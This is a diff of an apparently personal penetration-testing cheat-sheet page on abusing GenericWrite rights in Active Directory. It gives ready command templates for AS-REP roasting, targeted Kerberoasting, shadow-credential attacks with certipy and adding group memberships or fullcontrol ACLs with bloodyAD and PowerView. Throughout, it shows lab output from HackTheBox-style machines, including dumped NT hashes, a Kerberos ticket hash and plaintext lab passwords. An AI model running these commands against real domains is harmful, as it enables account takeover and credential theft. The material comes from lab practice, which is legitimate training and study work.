@@ -1,7 +1,7 @@
 ---
 title: "GenericWrite"
 date: 2024-7-13
-tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows"]
+tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows", "Disabled Account"]
 ---
 
 ### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User
@@ -10,10 +10,13 @@ tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite",
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
+#### 1. Enable Account \[Optional\]
+
 ```console
-# Enable Account (if Disabled)
 sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE
 ```
+
+#### 2. Add UF_DONT_REQUIRE_PREAUTH bit
 
 ```console
 sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH
@@ -82,10 +85,9 @@ VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for
 object 'user'
 ```
 
-#### 5. AS-REP Roasting
+#### 5. AS-REP Roasting (From Linux)
 
 ```console
-# In local linux machine
 impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC>
 ```
 
@@ -101,10 +103,31 @@ $krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
 
 ---
 
-### Abuse #2 : Kerberoasting by Adding SPN
+### Abuse #2 : Targeted Kerberoast
 
-{{< tab set2 tab1 >}}Windows{{< /tab >}}
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
+{{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
+
+```console
+# Password
+python3 targetedKerberoast.py -v -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
+```
+
+```console {class="sample-code"}
+$ python3 targetedKerberoast.py -v -d 'ADMINISTRATOR.HTB' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip '10.129.255.215'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (ethan)
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.HTB/ethan*$719ae93a160c94f2c6d7177cee77e7fb$5181256049f460e6bf16edef0850de21dc667b92081510623af531d8595c094d16038a9ce3cce9f073cf0aa1af4e622e87a44455724f6ef0c5aeb8e26f0c88b07712bc1cdbf34f7019c7a2b2397cd998db1e488b31bf51ebd2f9b6fde668d9713a4a7039e7cc02804e5493d95bac27bec7e8531e40d5afeb87523cf0c0d647b8b83d5fb29ad58f43a19f9c9f5d57b4429d817ea966c3296997b1241ba0c13fff9ec4d05c312db763f351f55bb76bddcf7e21ef284a8f4e84ea63ce377ae098a370c5ffe5b676116ca2d8fe2beec46af5d03ce8c6dd913e4dae37276153cfaf4e69d7e4ea2bdded3f75b3a51b8c57b408b332dc6878326b0276d85e5ff64a2dadbbd761e9f1346db7ab9cb8ac27afc819e89a5228b9bca828f3e1f360990cd60e3465e853347bcf425e8b713a40e3df276456b3ffd98a6ecc2daba5857055489f980725aa1d94cab0efff2b48cb115ea0b210865c5b938669c469d9d9c155af141044069780ff5ab1289d9f1b49e567a8162b4db28bd366a810c25b9164bd40a495172bf0b67ce52ff69b0f01d4bdfb37610bf19400d67c43efedbe4f24a5ce328758acdfc3f0ce6fc23548bb43e2c7f12d50e7a88ee61c64fabd03987102325f8a6d7a3a2a0ce480e0e2496ff72d4839ab3552053c8275debfbc005011b4bc0f9ffe50696aaba045e298712e4794e437fe6fe38f4b1bf1d4d48fca08721929a865021044bc5bd427a3a4fda1b0fc00d0ac6462e0a421600f3007f8b7976bd33a5ee9fa701d078a7f3f3b3417d025029a12e9155377bf17e8a64ddfb61f23752122e8094a7064c9aae2da4ada73e34ff2c24f3f83239057910e42abc14ad0a2bb7986971b21d8efadf205a12ac5379552d28dc6781fced2699a8b086d82ed5ff96a1bf34491707850533f550b287b34b486526f3008e5bd19b03cd6fad3f0a4cde95294525f4422abd90b7f4c51ecfc0590a74c50e71406be843371877385079796fdfbef564a3bc76cd14c2351614d8e07767997027aabc27e7132976691bfe6229b935d78922e7439fedeff25f58b2a06e24549a6b95913d267371e79f632f4c34b42de9bbd058102f36b790bcb376ed3ef528c5dca3daeaa474e627a23079e1d2e97bc152e87967253b958a76c41e814c9bebe93ff157ee326e29916a137dbc957c4c965d2e717f1aac0be2d6e2f9b8cf2d143d540484a68454580572fd054010102dbdefd1f21f9c2748d0bd314224c22de492e754285c0379894f4573583539bd74c0afe912114d8154bad5cf28cdf0983a0819a609981ff54285ca4d60abed3c4aa2c3536a4830142f614770a9aa93fff4ea8ae2344b0657ae11912b7301cc6555e71ba9e958c15d862de3f09e069b477044a09c66835908fb4423bff92f23fd2bf4b93f305bef94abc159cba3568dc1808228794d5a85afaaa4ad39d515772491856ed28abdb36901edf1f2f8d70fc15a089a543a70db0e2800a757af8a8312551e91e3996728e1e0139acfafae76f4943cef96632054ab598d1d15d
+[VERBOSE] SPN removed successfully for (ethan)
+```
+
+<small>*Ref: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
 
 #### 1. Import PowerView
 
@@ -133,12 +156,13 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
 ```
 
+#### 4. Check
+
 ```console
-# Check
 Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
 ```
 
-#### 4. Get the SPN
+#### 5. Get the SPN
 
 ```console
 Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
@@ -148,161 +172,101 @@ Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential 
 
 ---
 
-### Abuse #3: Add Shadow Credentials
+### Abuse #3: Shadow Credential
 
 {{< tab set3 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Request a ticket
-
 ```console
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -dc-ip <DC_IP>
+# Password
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.absolute.htb && impacket-getTGT 'absolute.htb/m.lovegod'
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+$ certipy-ad shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
-Password:
-[*] Saving ticket in m.lovegod.ccache
-```
-
-#### 2. Add Shadow Credentials
-
-```console
-export KRB5CCNAME=<USER>.ccache
-```
-
-```console {class="sample-code"}
-$ export KRB5CCNAME=m.lovegod.ccache
-```
-
-```console
-# Pre-check (Optional)
-certipy-ad find -username '<USER>@<DOMAIN>' -k -target <TARGET_DOMAIN>
-```
-
-```console {class="sample-code"}
-$ certipy-ad find -username 'm.lovegod@absolute.htb' -k -target dc.absolute.htb
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Finding certificate templates
-[*] Found 33 certificate templates
-[*] Finding certificate authorities
-[*] Found 1 certificate authority
-[*] Found 11 enabled certificate templates
-[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
-[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
-[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
-[*] Got CA configuration for 'absolute-DC-CA'
-[*] Saved BloodHound data to '20240924045839_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
-[*] Saved text output to '20240924045839_Certipy.txt'
-[*] Saved JSON output to '20240924045839_Certipy.json'
-```
-
-```console
-# Add shadow credentials
-certipy-ad shadow auto -username '<USER>@<DOMAIN>' -account <TARGET_USER> -k -target <TARGET_DOMAIN>
-```
-
-```console {class="sample-code"}
-$ certipy-ad shadow auto -username 'm.lovegod@absolute.htb' -account winrm_user -k -target dc.absolute.htb       
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Targeting user 'winrm_user'
+[*] Targeting user 'management_svc'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee'
-[*] Adding Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
-[*] Successfully added Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
-[*] Authenticating as 'winrm_user' with the certificate
-[*] Using principal: winrm_user@absolute.htb
+[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
+[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
+[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
+[*] Authenticating as 'management_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'management_svc@certified.htb'
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saved credential cache to 'winrm_user.ccache'
-[*] Trying to retrieve NT hash for 'winrm_user'
-[*] Restoring the old Key Credentials for 'winrm_user'
-[*] Successfully restored the old Key Credentials for 'winrm_user'
-[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
-```
-
-#### FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
-
-```console
-# No really a fix, need to runas administrator
-gpupdate /force
-```
-
-```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\Administrator\Documents> gpupdate /force
-Updating policy...
-
-Computer Policy update has completed successfully.
-
-User Policy update has completed successfully.
-```
-
-#### 3. Remote
-
-```console
-# Edit '/etc/krb5.conf' (All uppercase)
-[libdefaults]
-    default_realm = <DOMAIN>
-
-[realms]
-    <DOMAIN> = {
-        kdc = <DC>:88
-        admin_server = <DC>
-        default_domain = <DOMAIN>
-    }
-    
-[domain_realm]
-    .domain.internal = <DOMAIN>
-    domain.internal = <DOMAIN>
-```
-
-```console {class="sample-code"}
-[libdefaults]
-    default_realm = ABSOLUTE.HTB
-
-[realms]
-    ABSOLUTE.HTB = {
-        kdc = DC.ABSOLUTE.HTB:88
-        admin_server = DC.ABSOLUTE.HTB
-        default_domain = ABSOLUTE.HTB
-    }
-    
-[domain_realm]
-    .domain.internal = ABSOLUTE.HTB
-    domain.internal = ABSOLUTE.HTB
-```
-
-<br>
-
-```console
-export KRB5CCNAME=<TARGET_USER>.ccache
-```
-
-```console {class="sample-code"}
-$ export KRB5CCNAME=winrm_user.ccache
+[*] Saving credential cache to 'management_svc.ccache'
+File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Restoring the old Key Credentials for 'management_svc'
+[*] Successfully restored the old Key Credentials for 'management_svc'
+[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
 ```
 
 ```console
-evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
+# NTLM
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ evil-winrm -i dc.absolute.htb -r absolute.htb
-                                        
-Evil-WinRM shell v3.5
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
+$ certipy-ad shadow auto -username 'management_svc@CERTIFIED.HTB' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_operator'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
+[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
+[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
+[*] Authenticating as 'ca_operator' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_operator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_operator.ccache'
+[*] Wrote credential cache to 'ca_operator.ccache'
+[*] Trying to retrieve NT hash for 'ca_operator'
+[*] Restoring the old Key Credentials for 'ca_operator'
+[*] Successfully restored the old Key Credentials for 'ca_operator'
+[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
+```
+
+```console
+# Kerberos
+sudo ntpdate -s <DC_IP> && certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -ldap-scheme ldap -ns <DC_IP> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.232.31 && certipy-ad shadow auto -username oorend@REBOUND.HTB -password '1GR8t@$$4u' -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
+[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@rebound.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
 ```
 
 {{< /tabcontent >}}
@@ -318,7 +282,7 @@ Info: Establishing connection to remote endpoint
 #### 1. Add Self to Group
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
@@ -328,7 +292,7 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add gr
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
@@ -340,7 +304,7 @@ $ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.ab
 #### 2. Add GenericAll over Target Group
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
@@ -350,7 +314,7 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add ge
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
@@ -367,7 +331,7 @@ $ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.ab
 #### 1. Connect
 
 ```console
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 ```console {class="sample-code"}
@@ -389,8 +353,9 @@ PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
 [2024-09-24 07:13:17] User oorend successfully added to servicemgmt
 ```
 
+#### 3. Check
+
 ```console
-# Check
 Get-DomainGroupMember -Identity '<GROUP>'
 ```
 
@@ -416,7 +381,7 @@ MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 #### 4. Add Fullcontrol over Target Group
 
 ```console
-# Exit and login again to apply changes
+# Exit and login to apply changes
 Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
 ```
 
@@ -428,8 +393,9 @@ PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oor
 [2024-09-24 07:37:24] DACL modified successfully!
 ```
 
+#### 5. Check
+
 ```console
-# Check
 Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
 ```
 
@@ -489,8 +455,9 @@ PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members
 Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
 ```
 
+#### 4. Check
+
 ```console
-# Check
 Get-DomainGroupMember -Identity '<GROUP>'
 ```
 
